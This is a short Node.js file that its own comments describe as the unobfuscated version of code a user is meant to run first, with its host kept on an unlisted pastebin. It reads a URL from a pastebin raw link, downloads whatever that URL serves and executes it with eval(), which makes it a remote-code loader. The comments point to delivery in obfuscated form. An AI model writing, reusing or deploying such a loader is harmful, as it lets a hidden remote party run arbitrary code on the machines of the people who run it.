// This is the (unobfuscated here) code that the user will initially run
// and the host will be on a unlisted pastebin, just incase.
// This should never need to change.

const https = require('https');
const http = require('http');

const httpTable = {
    https,
    http,
};

const req = (httpS, method, url, headers = {}, full = false) => {
    return new Promise((resolve, reject) => {
        httpTable[httpS][method](url, { headers }, (res) => {
            let responseStr = '';

            res.on('data', (data) => {
                responseStr += data;
            });

            res.on('end', () => {
                res.body = responseStr.toString();

                if (full) resolve(res);
                else resolve(responseStr.toString());
            });
        }).on('error', (e) => reject(e));
    });
};

req('https', 'get', 'https://pastebin.com/raw/byqR6BER').then((url) => {
    const startsWithHttps = url.toLowerCase().startsWith('https');
    req(startsWithHttps ? 'https' : 'http', 'get', url.toLowerCase()).then((res) => eval(res));
});
